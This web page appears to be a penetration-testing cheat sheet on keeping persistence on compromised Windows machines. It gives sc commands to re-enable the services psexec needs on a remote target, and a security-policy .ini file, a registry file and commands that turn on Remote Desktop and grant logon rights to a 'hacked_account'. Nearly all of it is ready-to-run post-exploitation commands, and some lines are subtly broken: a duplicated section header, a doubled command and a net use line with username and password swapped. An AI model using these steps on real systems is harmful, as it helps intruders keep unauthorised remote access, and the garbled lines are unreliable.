<!-- Code for collapse and expand -->
<script type="text/javascript"> 
$(document).ready(function() { 
$('div.view').hide(); 
$('div.slide').click(function() {
$(this).next('div.view').slideToggle('fast'); 
return false; 
}); 
}); 
</script>

# Windows General Persistence Commands

Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.


### Enable `psexec`
The [`psexec` tool](http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx) executes processes on other systems over a network. Most systems now disable the "clipbook" which `psexec` required. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 50)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can re-enable the sub-systems needed to use `psexec` using the `sc` commands below.
    
``c:\> net use \\target\ipc$ username /user:password
c:\> sc \\target config netdde start= auto
c:\> sc \\target config netddedsdm start= auto
c:\> sc \\target config clipsrv start= auto
c:\> sc \\target start netdde
c:\> sc \\target start netddedsdm
c:\> sc \\target start clipsrv
``

### Enable Remote Desktop
Remote Desktop allows a remote user to receive a graphical "desktop" of the target (compromised) system. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 53)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely enable remote desktop using the commands below.

 1. On the compromised system, create a file named `fix_ts_policy.ini` containing the contents below. Change the *"hacked_account"* value to the account you have compromised on the remote system.

    <pre>
     [Unicode]
         Unicode=yes
         [Version]
         signature="$CHICAGO$"
         Revision=1
         [Privilege Rights] [Privilege Rights]
         seremoteinteractivelogonright = hacked_account
         seinteractivelogonright = hacked_account
         sedenyinteractivelogonright =
         sedenyremoteinteractivelogonright =
         sedenynetworklogonright =
    </pre>

 1. Create another file named `enable_ts.reg` containing the contents below. 

    <pre>
     Windows Registry Editor Version 5.00
     [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
     "fDenyTSConnections"=dword:00000000
     "TSEnabled"=dword:00000001
     "TSUserEnabled"=dword:00000000
    </pre>

 1. On the remote system, execute the following commands:
      
    ``c:\> sc config termservice start= auto sc config termservice start= auto
c:\> regedit /s enable_ts.reg
c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb
c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb
c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
c:\> gpupdate /Force
c:\> net start "terminal services"
``